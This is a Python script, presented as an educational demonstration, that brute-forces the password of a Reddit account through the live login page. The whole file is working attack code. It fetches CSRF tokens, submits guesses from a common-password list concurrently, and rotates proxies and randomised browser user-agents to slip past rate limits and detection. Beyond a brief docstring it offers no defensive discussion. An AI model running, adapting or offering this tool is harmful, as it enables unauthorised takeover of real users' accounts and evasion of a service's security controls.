# *- coding: utf-8 -*-
# hack_reddit_acct.py
# 03-31-2021 06:52:45 EDT
# (c) 2021 acamso

"""Example of a Reddit account cracker.

This is a demonstration of how one would go about hacking an account with password authentication via
brute force (password cracking). For this example, a new Reddit account is created with a common password.
This is simply for educational purposes.

Video: https://youtu.be/O0DkieZjClI
"""

import asyncio
import random
from typing import List, Optional

import aiohttp
import lxml.html
import user_agents
from faker import Faker

faker = Faker()

# constants
URL = "https://www.reddit.com/login"
TIMEOUT = 10
USER = "a_username"
PWORDS = {  # can come from file
    "123456",
    "123456789",
    "picture1",
    "password",
    "12345678",
    "111111",
    "123123",
    "12345",
    "1234567890",
}
HEADERS = {
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://www.reddit.com",
    "Referer": "https://www.reddit.com/login/",
}
DATA = {
    "otp": "",
    "dest": "https://www.reddit.com",
    "username": USER,
}
PROXY_FILE = "/home/user/proxies.txt"
with open(PROXY_FILE) as f:
    PROXIES = ["http://" + p for p in f.read().splitlines()]


def ua() -> str:
    """Returns random Chrome user-agent string."""

    while True:
        _ua = faker.chrome(85, 87)
        parse = user_agents.parse(_ua)
        if parse.is_mobile or parse.is_tablet:
            continue
        return _ua


async def _get_csrf(ses: aiohttp.ClientSession, proxy: str) -> Optional[str]:
    """Retrieves CSRF token."""

    async with ses.get(URL, proxy=proxy) as resp:
        if not resp.ok:
            return None
        content = await resp.read()

    tree = lxml.html.fromstring(content)
    els = tree.xpath("//input[@name='csrf_token']")
    if not els:
        return None
    return els[0].value


async def req(pword: str) -> Optional[str]:
    """Attempts to log into account with provided password."""
    print(f"Trying {pword} for {USER}")

    while True:

        proxy = random.choice(PROXIES)
        headers, data = HEADERS.copy(), DATA.copy()
        headers["User-Agent"] = ua()
        data["password"] = pword

        async with aiohttp.ClientSession(headers=headers) as ses:
            try:
                csrf = await _get_csrf(ses, proxy)
                if not csrf:
                    continue
                data["csrf_token"] = csrf
                async with ses.post(URL, data=data, proxy=proxy, timeout=TIMEOUT) as resp:
                    # 429 status would require delay
                    if resp.status not in (200, 400):
                        continue
                    if resp.status == 400:
                        return None
                    print(f"{pword} succeeded for {USER}")
                    return pword
            except:  # pylint: disable=bare-except
                # request-related exceptions
                pass


async def run() -> List[Optional[str]]:
    tasks = [req(pword) for pword in PWORDS]
    return await asyncio.gather(*tasks)


if __name__ == "__main__":
    res = asyncio.run(run())
    correct_pword = next((x for x in res if x), None)
    msg = "No password succeeded." if not correct_pword else f"The password is {correct_pword}"
    print(msg)
